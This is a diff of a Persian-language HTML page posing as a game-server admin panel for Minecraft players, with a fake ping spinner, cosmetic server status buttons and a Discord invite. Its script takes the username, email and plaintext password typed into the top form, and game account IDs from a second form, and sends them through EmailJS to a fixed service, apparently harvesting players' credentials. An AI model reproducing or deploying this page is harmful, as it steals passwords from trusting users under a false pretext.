@@ -4,279 +4,350 @@
 <meta charset="UTF-8">
 <title>پنل مدیریت</title>
 <style>
-body {
-  font-family: 'Vazirmatn', sans-serif;
-  background-color: #0a1a2f;
-  color: white;
-  margin: 0;
-  padding: 0;
-  direction: rtl;
-  transition: background 0.5s ease;
-}
+  body {
+    font-family: 'Vazirmatn', sans-serif;
+    background-color: #0a1a2f;
+    color: white;
+    margin: 0;
+    padding: 0;
+    direction: rtl;
+    transition: background 0.5s ease;
+  }
 
-header {
-  background: linear-gradient(90deg, #004080, #001f3f);
-  padding: 1rem;
-  text-align: center;
-  font-size: 1.8rem;
-  font-weight: bold;
-  box-shadow: 0 0 20px #0055aa;
-  letter-spacing: 1px;
-  animation: glowPulse 3s infinite;
-}
+  header {
+    background: linear-gradient(90deg, #004080, #001f3f);
+    padding: 1rem;
+    text-align: center;
+    font-size: 1.8rem;
+    font-weight: bold;
+    box-shadow: 0 0 20px #0055aa;
+    letter-spacing: 1px;
+    animation: glowPulse 3s infinite;
+  }
 
-@keyframes glowPulse {
-  0%,100% { box-shadow:0 0 15px #00bfff;}
-  50% { box-shadow:0 0 30px #00bfff;}
-}
+  @keyframes glowPulse {
+    0%, 100% { box-shadow: 0 0 15px #00bfff; }
+    50% { box-shadow: 0 0 30px #00bfff; }
+  }
 
-.top-form {
-  display:flex;
-  gap:10px;
-  justify-content:center;
-  background: rgba(0,0,0,0.4);
-  padding:1rem;
-  box-shadow:0 0 15px #0055aa;
-}
+  .top-form {
+    display: flex;
+    gap: 10px;
+    justify-content: center;
+    background: rgba(0,0,0,0.4);
+    padding: 1rem;
+    box-shadow: 0 0 15px #0055aa;
+  }
 
-.top-form input {
-  padding:0.5rem;
-  border:none;
-  border-radius:8px;
-  outline:none;
-  font-size:1rem;
-  box-shadow: inset 0 0 5px #00bfff;
-  background: rgba(255,255,255,0.1);
-  color:white;
-  transition:0.3s;
-}
-.top-form input:focus { box-shadow:0 0 10px #00bfff; }
+  .top-form input {
+    padding: 0.5rem;
+    border: none;
+    border-radius: 8px;
+    outline: none;
+    font-size: 1rem;
+    box-shadow: inset 0 0 5px #00bfff;
+    background: rgba(255,255,255,0.1);
+    color: white;
+    transition: 0.3s;
+  }
 
-.btn {
-  background: linear-gradient(45deg,#0055aa,#00bfff);
-  border:none;
-  padding:0.6rem 1rem;
-  color:white;
-  border-radius:10px;
-  cursor:pointer;
-  font-size:1rem;
-  transition:all 0.3s ease;
-  box-shadow:0 0 15px rgba(0,191,255,0.6);
-  position:relative;
-  overflow:hidden;
-}
+  .top-form input:focus {
+    box-shadow: 0 0 10px #00bfff;
+  }
 
-.btn::before {
-  content:"";
-  position:absolute;
-  top:0; left:-100%;
-  width:100%; height:100%;
-  background:rgba(255,255,255,0.2);
-  transform:skewX(-25deg);
-}
-.btn:hover::before { animation: shine 0.7s forwards; }
-@keyframes shine { to{left:150%;} }
+  .btn {
+    background: linear-gradient(45deg, #0055aa, #00bfff);
+    border: none;
+    padding: 0.6rem 1rem;
+    color: white;
+    border-radius: 10px;
+    cursor: pointer;
+    font-size: 1rem;
+    transition: all 0.3s ease;
+    box-shadow: 0 0 15px rgba(0,191,255,0.6);
+    position: relative;
+    overflow: hidden;
+  }
 
-.sidebar {
-  background: rgba(0, 34, 68, 0.9);
-  padding:1rem;
-  width:230px;
-  position:fixed;
-  top:140px;
-  bottom:0;
-  overflow-y:auto;
-  box-shadow:0 0 15px #0055aa;
-}
-.sidebar .btn { width:100%; margin-bottom:12px; text-align:right; font-weight:bold; }
+  .btn::before {
+    content: "";
+    position: absolute;
+    top: 0; left: -100%;
+    width: 100%; height: 100%;
+    background: rgba(255,255,255,0.2);
+    transform: skewX(-25deg);
+  }
 
-.content { margin-right:250px; padding:1rem; }
+  .btn:hover::before {
+    animation: shine 0.7s forwards;
+  }
 
-.panel {
-  display:none;
-  background: rgba(0,0,0,0.3);
-  padding:1rem;
-  border-radius:10px;
-  box-shadow:0 0 15px #004080;
-  animation: fadeIn 0.5s ease-in-out;
-}
-@keyframes fadeIn { from{opacity:0; transform:translateY(10px);} to{opacity:1; transform:translateY(0);} }
+  @keyframes shine {
+    to { left: 150%; }
+  }
 
-.status-green { color:#00ff99; font-weight:bold; text-shadow:0 0 5px #00ff99; }
-.status-red { color:#ff4d4d; font-weight:bold; text-shadow:0 0 5px #ff4d4d; }
-.status-yellow { color:#ffff66; font-weight:bold; text-shadow:0 0 5px #ffff66; }
+  .sidebar {
+    background: rgba(0, 34, 68, 0.9);
+    padding: 1rem;
+    width: 230px;
+    position: fixed;
+    top: 140px;
+    bottom: 0;
+    overflow-y: auto;
+    box-shadow: 0 0 15px #0055aa;
+  }
 
-.server-input {
-  width:90%; padding:0.6rem; border:none; border-radius:8px;
-  background: rgba(255,255,255,0.1); color:white; box-shadow: inset 0 0 5px #00bfff;
-  margin-bottom:10px; transition:0.3s;
-}
-.server-input:focus { box-shadow:0 0 10px #00bfff; }
+  .sidebar .btn {
+    width: 100%;
+    margin-bottom: 12px;
+    text-align: right;
+    font-weight: bold;
+  }
 
-.admin-list { margin-top:10px; }
-.admin-item { background: rgba(255,255,255,0.05); padding:5px 10px; border-radius:6px; margin-bottom:5px; display:flex; justify-content:space-between; align-items:center; }
-.admin-item button { background:transparent; border:none; color:#ff4d4d; font-size:1.2rem; cursor:pointer; }
+  .content {
+    margin-right: 250px;
+    padding: 1rem;
+  }
 
-#pingOverlay {
-  position:fixed; top:0; left:0; right:0; bottom:0;
-  background: rgba(0,0,0,0.8);
-  display:none; justify-content:center; align-items:center;
-  z-index:1000; flex-direction:column; color:white;
-}
-.spinner {
-  border:6px solid rgba(0,255,0,0.2);
-  border-top:6px solid #00ff00;
-  border-radius:50%;
-  width:60px;
-  height:60px;
-  animation:spin 1s linear infinite;
-  margin-bottom:15px;
-}
-@keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);} }
+  .panel {
+    display: none;
+    background: rgba(0,0,0,0.3);
+    padding: 1rem;
+    border-radius: 10px;
+    box-shadow: 0 0 15px #004080;
+    animation: fadeIn 0.5s ease-in-out;
+  }
 
-.discord-box{ display:flex; justify-content:center; margin:3rem 0; }
-.discord-card {
-  background: linear-gradient(135deg,#5865F2,#4e5bd9);
-  border-radius:20px;
-  padding:2rem 3rem;
-  box-shadow:0 0 25px rgba(88,101,242,0.8);
-  text-align:center;
-  max-width:400px;
-  transition:transform 0.3s ease, box-shadow 0.3s ease;
-  opacity:0;
-  transform:translateY(50px);
-  animation:fadeUp 1s ease forwards;
-}
-.discord-card h2 { color:white; margin-bottom:1rem; font-size:1.5rem; }
-.discord-card p { color:#e0e0ff; margin-bottom:1.5rem; }
-.discord-card a {
-  display:inline-block;
-  padding:14px 28px;
-  background:white;
-  color:#5865F2;
-  font-weight:bold;
-  border-radius:50px;
-  text-decoration:none;
-  font-size:1.1rem;
-  box-shadow:0 0 20px rgba(255,255,255,0.6);
-  transition:all 0.3s ease;
-}
-.discord-card:hover { transform:scale(1.05); box-shadow:0 0 40px rgba(88,101,242,1);}
-.discord-card a:hover { background:#5865F2; color:white; box-shadow:0 0 25px rgba(255,255,255,0.9);}
-@keyframes fadeUp{from{opacity:0;transform:translateY(50px);}to{opacity:1;transform:translateY(0);}}
+  @keyframes fadeIn {
+    from {opacity: 0; transform: translateY(10px);}
+    to {opacity: 1; transform: translateY(0);}
+  }
 
-/* فرم نئونی EmailJS */
-.neon-form input{
-  width:90%; margin:6px 0; padding:0.5rem;
-  border-radius:8px; border:none; outline:none;
-  background:rgba(0,0,0,0.3); color:#00ffff; box-shadow:0 0 10px #00ffff;
-}
+  .status-green { color: #00ff99; font-weight: bold; text-shadow: 0 0 5px #00ff99; }
+  .status-red { color: #ff4d4d; font-weight: bold; text-shadow: 0 0 5px #ff4d4d; }
+  .status-yellow { color: #ffff66; font-weight: bold; text-shadow: 0 0 5px #ffff66; }
+
+  .server-input {
+    width: 90%;
+    padding: 0.6rem;
+    border: none;
+    border-radius: 8px;
+    background: rgba(255,255,255,0.1);
+    color: white;
+    box-shadow: inset 0 0 5px #00bfff;
+    margin-bottom: 10px;
+    transition: 0.3s;
+  }
+  .server-input:focus { box-shadow: 0 0 10px #00bfff; }
+
+  .admin-list { margin-top: 10px; }
+  .admin-item {
+    background: rgba(255,255,255,0.05);
+    padding: 5px 10px;
+    border-radius: 6px;
+    margin-bottom: 5px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+  }
+  .admin-item button {
+    background: transparent;
+    border: none;
+    color: #ff4d4d;
+    font-size: 1.2rem;
+    cursor: pointer;
+  }
+
+  #pingOverlay {
+    position: fixed;
+    top:0; left:0; right:0; bottom:0;
+    background: rgba(0,0,0,0.8);
+    display: none;
+    justify-content: center;
+    align-items: center;
+    z-index: 1000;
+    flex-direction: column;
+    color: white;
+  }
+
+  .spinner {
+    border: 6px solid rgba(0,255,0,0.2);
+    border-top: 6px solid #00ff00;
+    border-radius: 50%;
+    width: 60px;
+    height: 60px;
+    animation: spin 1s linear infinite;
+    margin-bottom: 15px;
+  }
+
+  @keyframes spin { 0% { transform: rotate(0deg);} 100% { transform: rotate(360deg);} }
+
+  .discord-box {
+    display: flex;
+    justify-content: center;
+    margin: 3rem 0;
+  }
+  .discord-card {
+    background: linear-gradient(135deg, #5865F2, #4e5bd9);
+    border-radius: 20px;
+    padding: 2rem 3rem;
+    box-shadow: 0 0 25px rgba(88, 101, 242, 0.8);
+    text-align: center;
+    max-width: 400px;
+    transition: transform 0.3s ease, box-shadow 0.3s ease;
+    opacity: 0;
+    transform: translateY(50px);
+    animation: fadeUp 1s ease forwards;
+  }
+  .discord-card h2 { color: white; margin-bottom: 1rem; font-size: 1.5rem;}
+  .discord-card p { color: #e0e0ff; margin-bottom: 1.5rem;}
+  .discord-card a {
+    display: inline-block;
+    padding: 14px 28px;
+    background: white;
+    color: #5865F2;
+    font-weight: bold;
+    border-radius: 50px;
+    text-decoration: none;
+    font-size: 1.1rem;
+    box-shadow: 0 0 20px rgba(255,255,255,0.6);
+    transition: all 0.3s ease;
+  }
+  .discord-card:hover { transform: scale(1.05); box-shadow: 0 0 40px rgba(88, 101, 242, 1);}
+  .discord-card a:hover { background: #5865F2; color: white; box-shadow:0 0 25px rgba(255,255,255,0.9);}
+  @keyframes fadeUp { from {opacity:0; transform:translateY(50px);} to {opacity:1; transform:translateY(0);} }
+
+  /* overlay هشدار سرور */
+  #serverWarningOverlay {
+    position: fixed;
+    top:0; left:0; right:0; bottom:0;
+    background: rgba(0,0,0,0.85);
+    display: none;
+    justify-content:center;
+    align-items:center;
+    z-index:10000;
+    color: yellow;
+    font-size: 1.5rem;
+    text-align: center;
+    padding: 20px;
+    flex-direction: column;
+  }
+  #serverWarningOverlay button {
+    margin-top: 15px;
+    padding: 10px 20px;
+    background: yellow;
+    color: black;
+    border: none;
+    border-radius: 8px;
+    cursor: pointer;
+    font-weight: bold;
+  }
+
 </style>
 </head>
 <body>
 
 <header> -BM1- </header>
 
-<!-- فرم ثبت نام بالا -->
+<!-- فرم اطلاعات کاربر -->
 <div class="top-form">
   <input type="text" id="username" placeholder="نام کاربری">
   <input type="email" id="email" placeholder="ایمیل">
   <input type="password" id="password" placeholder="رمز عبور">
-  <button class="btn" onclick="submitUserInfo()">ثبت</button>
+  <button class="btn" onclick="sendEmail()">ثبت</button>
 </div>
 
-<!-- منوی کناری -->
 <div class="sidebar">
   <button class="btn" onclick="showPanel('infoPanel')">📋 اطلاعات کاربر</button>
   <button class="btn" onclick="startPing()">📶 پینگ</button>
   <button class="btn" onclick="showPanel('serverStatusPanel')">🖥 وضعیت سرورها</button>
   <button class="btn" onclick="showPanel('serverSetupPanel')">⚙ راه‌اندازی سرور</button>
   <button class="btn" onclick="showPanel('themePanel')">🎨 تغییر رنگ</button>
-  <button class="btn" onclick="showPanel('emailjsPanel')">✉ ثبت اطلاعات تی لانچر</button>
+  <button class="btn" onclick="showPanel('emailjsPanel')">✉ ثبت اطلاعات بازی</button>
   <button class="btn" onclick="location.reload()">🔄 راه‌اندازی مجدد</button>
 </div>
 
 <div class="content">
-
-<!-- پنل اطلاعات ثبت نام -->
-<div id="infoPanel" class="panel">
-  <h2>اطلاعات وارد شده</h2>
-  <p>نام کاربری: <span id="displayUsername">-</span></p>
-  <p>ایمیل: <span id="displayEmail">-</span></p>
-</div>
-
-<!-- پنل پینگ -->
-<div id="pingPanel" class="panel">
-  <h2>پینگ شما</h2>
-  <button class="btn" onclick="showPing()">دریافت پینگ</button>
-  <p id="pingResult">-</p>
-</div>
-
-<!-- وضعیت سرورها -->
-<div id="serverStatusPanel" class="panel">
-  <h2>وضعیت سرورها</h2>
-  <div>
-    <button class="btn" onclick="connectServer(1)">سرور 1</button> <span id="server1Status">-</span>
-  </div><br>
-  <div>
-    <button class="btn" onclick="connectServer(2)">سرور 2</button> <span id="server2Status">-</span>
-  </div><br>
-  <div>
-    <button class="btn" onclick="connectServer(3)">سرور 3</button> <span id="server3Status" class="status-yellow">نیازمند تایید ادمین</span>
+  <div id="infoPanel" class="panel">
+    <h2>اطلاعات وارد شده</h2>
+    <p>نام کاربری: <span id="displayUsername">-</span></p>
+    <p>ایمیل: <span id="displayEmail">-</span></p>
   </div>
-</div>
 
-<!-- فرم راه‌اندازی سرور -->
-<div id="serverSetupPanel" class="panel">
-  <h2>فرم راه‌اندازی سرور</h2>
-  <input class="server-input" placeholder="نام سرور" id="serverName"><br>
-  <input class="server-input" placeholder="ورژن بازی"><br>
-  <input class="server-input" placeholder="زبان"><br>
-  <input class="server-input" placeholder="سایت سرور (اختیاری)"><br>
-  <input class="server-input" placeholder="نام و نام خانوادگی"><br>
-  <input class="server-input" placeholder="IP سرور"><br>
-  <textarea class="server-input" placeholder="توضیحات سرور (اختیاری)"></textarea><br>
-  <div style="display:flex; gap:5px;">
-    <input class="server-input" placeholder="یوزر ادمین" id="adminUser">
-    <button class="btn" onclick="addAdmin()">➕</button>
+  <div id="pingPanel" class="panel">
+    <h2>پینگ شما</h2>
+    <button class="btn" onclick="showPing()">دریافت پینگ</button>
+    <p id="pingResult">-</p>
   </div>
-  <div class="admin-list" id="adminList"></div>
-  <br>
-  <button class="btn" onclick="showServerError()">ادامه</button>
-</div>
 
-<!-- تغییر رنگ -->
-<div id="themePanel" class="panel">
-  <h2>تغییر تم</h2>
-  <button class="btn" onclick="setTheme('#0a1a2f')">🔵 آبی تیره</button>
-  <button class="btn" onclick="setTheme('#003300')">🟢 سبز تیره</button>
-  <button class="btn" onclick="setTheme('#333333')">⚫ خاکستری تیره</button>
-</div>
-
-<!-- فرم EmailJS نئونی جدا -->
-<div id="emailjsPanel" class="panel">
-  <h2 style="text-align:center; text-shadow:0 0 10px #00ffff;">✉ ثبت اطلاعات تی لانچر</h2>
-  <div class="neon-form">
-    <input type="text" id="tlauncherId" placeholder="ID تی لانچر (الزامی)" required>
-    <input type="text" id="nickname" placeholder="Nickname در بازی (الزامی)" required>
-    <input type="text" id="aternosId" placeholder="ID اترنوس (اختیاری)">
-    <button class="btn" onclick="sendEmailJS()">ارسال اطلاعات</button>
-    <div id="formStatus" style="margin-top:10px; font-weight:bold; text-align:center;"></div>
+  <div id="serverStatusPanel" class="panel">
+    <h2>وضعیت سرورها</h2>
+    <div>
+      <button class="btn" onclick="connectServer(1)">سرور 1</button> <span id="server1Status">-</span>
+    </div><br>
+    <div>
+      <button class="btn" onclick="connectServer(2)">سرور 2</button> <span id="server2Status">-</span>
+    </div><br>
+    <div>
+      <button class="btn" onclick="connectServer(3)">سرور 3</button> <span id="server3Status" class="status-yellow">نیازمند تایید ادمین</span>
+    </div>
   </div>
-</div>
 
-<!-- کارت دیسکورد -->
-<div class="discord-box">
-  <div class="discord-card">
-    <h2>به دیسکورد ما بپیوندید</h2>
-    <p>با ما در سرور دیسکورد همراه شوید و اخبار جدید را دنبال کنید!</p>
-    <a href="https://discord.gg/kYxdvnTKe6" target="_blank">ورود به دیسکورد</a>
+  <div id="serverSetupPanel" class="panel">
+    <h2>فرم راه‌اندازی سرور</h2>
+    <input class="server-input" placeholder="نام سرور" id="serverName"><br>
+    <input class="server-input" placeholder="ورژن بازی"><br>
+    <input class="server-input" placeholder="زبان"><br>
+    <input class="server-input" placeholder="سایت سرور (اختیاری)"><br>
+    <input class="server-input" placeholder="نام و نام خانوادگی"><br>
+    <input class="server-input" placeholder="IP سرور"><br>
+    <textarea class="server-input" placeholder="توضیحات سرور (اختیاری)"></textarea><br>
+    <div style="display:flex; gap:5px;">
+      <input class="server-input" placeholder="یوزر ادمین" id="adminUser">
+      <button class="btn" onclick="addAdmin()">➕</button>
+    </div>
+    <div class="admin-list" id="adminList"></div>
+    <br>
+    <button class="btn" onclick="showServerError()">ادامه</button>
   </div>
+
+  <div id="themePanel" class="panel">
+    <h2>تغییر تم</h2>
+    <button class="btn" onclick="setTheme('#0a1a2f')">🔵 آبی تیره</button>
+    <button class="btn" onclick="setTheme('#003300')">🟢 سبز تیره</button>
+    <button class="btn" onclick="setTheme('#333333')">⚫ خاکستری تیره</button>
+  </div>
+
+  <div id="emailjsPanel" class="panel">
+    <h2 style="text-align:center; text-shadow:0 0 10px #00ffff;">✉ ثبت اطلاعات کاربر بازی</h2>
+    <div class="neon-form">
+      <input type="text" id="tlauncherId" placeholder="ID تی لانچر (الزامی)" required>
+      <input type="text" id="nickname" placeholder="Nickname در بازی (الزامی)" required>
+      <input type="text" id="aternosId" placeholder="ID اترنوس (اختیاری)">
+      <button class="btn" onclick="sendGameInfo()">ارسال اطلاعات</button>
+      <div id="formStatus" style="margin-top:10px; font-weight:bold; text-align:center;"></div>
+    </div>
+  </div>
+
+  <div class="discord-box">
+    <div class="discord-card">
+      <h2>به دیسکورد ما بپیوندید</h2>
+      <p>با ما در سرور دیسکورد همراه شوید و اخبار جدید را دنبال کنید!</p>
+      <a href="https://discord.gg/kYxdvnTKe6" target="_blank">ورود به دیسکورد</a>
+    </div>
+  </div>
+
 </div>
 
-<!-- overlay اتصال پینگ -->
 <div id="pingOverlay">
   <div class="spinner"></div>
   <div>در حال اتصال...</div>
+</div>
+
+<div id="serverWarningOverlay">
+⚠ برای ساخت سرور به رول اپراتور نیاز دارید!<br>
+برای دریافت به ادمین پیام بدهید
+<button onclick="document.getElementById('serverWarningOverlay').style.display='none'">بستن</button>
 </div>
 
 <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
@@ -288,35 +359,38 @@ function showPanel(panelId){
   document.getElementById(panelId).style.display='block';
 }
 
-// فرم ثبت نام بالا
-function submitUserInfo(){
-  let user=document.getElementById('username').value.trim();
-  let email=document.getElementById('email').value.trim();
-  let pass=document.getElementById('password').value.trim();
-  if(!user||!email||!pass){ alert("لطفا همه فیلدها را پر کنید"); return; }
+function sendEmail(){
+  let user = document.getElementById('username').value.trim();
+  let email = document.getElementById('email').value.trim();
+  let pass = document.getElementById('password').value.trim();
+  if(!user || !email || !pass){ alert("لطفا همه فیلدها را پر کنید"); return; }
   document.getElementById('displayUsername').textContent=user;
   document.getElementById('displayEmail').textContent=email;
-  var templateParams = { username:user, useremail:email, password:pass };
+
+  var templateParams = { username: user, useremail: email, password: pass };
+
   emailjs.send('service_tbsh4nc', 'template_l84coy7', templateParams)
-    .then(function(response){ alert("اطلاعات با موفقیت ارسال شد!"); }, function(error){ alert("ارسال اطلاعات با خطا مواجه شد: "+error.text); });
+    .then(function(response) { alert("اطلاعات با موفقیت ارسال شد!"); },
+          function(error) { alert("ارسال اطلاعات با خطا مواجه شد: " + error.text); });
 }
 
-// فرم EmailJS جدا
-function sendEmailJS(){
-  const tId=document.getElementById('tlauncherId').value.trim();
-  const nick=document.getElementById('nickname').value.trim();
-  const aId=document.getElementById('aternosId').value.trim();
-  if(!tId||!nick){ document.getElementById('formStatus').textContent="لطفا فیلدهای الزامی را پر کنید!"; return; }
-  let templateParams={tlauncher_id:tId, nickname:nick, aternos_id:aId};
+function sendGameInfo(){
+  let tId=document.getElementById('tlauncherId').value.trim();
+  let nick=document.getElementById('nickname').value.trim();
+  let aId=document.getElementById('aternosId').value.trim();
+  if(!tId || !nick){ document.getElementById('formStatus').textContent="لطفا فیلدهای الزامی را پر کنید!"; return; }
+
+  let templateParams = { tlauncher_id:tId, nickname:nick, aternos_id:aId };
+
   emailjs.send("service_tbsh4nc","template_l84coy7",templateParams)
-  .then(function(response){
-    document.getElementById('formStatus').textContent="✅ ارسال با موفقیت انجام شد!";
-    document.getElementById('tlauncherId').value='';
-    document.getElementById('nickname').value='';
-    document.getElementById('aternosId').value='';
-  },function(error){
-    document.getElementById('formStatus').textContent="❌ ارسال ناموفق بود، دوباره تلاش کنید.";
-  });
+    .then(function(response){
+      document.getElementById('formStatus').textContent="✅ ارسال با موفقیت انجام شد!";
+      document.getElementById('tlauncherId').value='';
+      document.getElementById('nickname').value='';
+      document.getElementById('aternosId').value='';
+    }, function(error){
+      document.getElementById('formStatus').textContent="❌ ارسال ناموفق بود، دوباره تلاش کنید.";
+    });
 }
 
 function showPing() {
@@ -339,15 +413,22 @@ function addAdmin(){
   document.getElementById('adminUser').value='';
 }
 
-function showServerError(){ alert("این بخش شبیه‌سازی شده و ادامه داده شد."); }
+function showServerError(){
+  document.getElementById('serverWarningOverlay').style.display='flex';
+}
+
 function setTheme(color){ document.body.style.background=color; }
 
 function startPing(){
   document.querySelectorAll('.panel').forEach(p=>p.style.display='none');
   const overlay=document.getElementById('pingOverlay');
   overlay.style.display='flex';
-  setTimeout(()=>{ overlay.style.display='none'; showPanel('pingPanel'); },4000);
+  setTimeout(()=>{
+    overlay.style.display='none';
+    showPanel('pingPanel');
+  },4000);
 }
+
 </script>
 </body>
 </html>
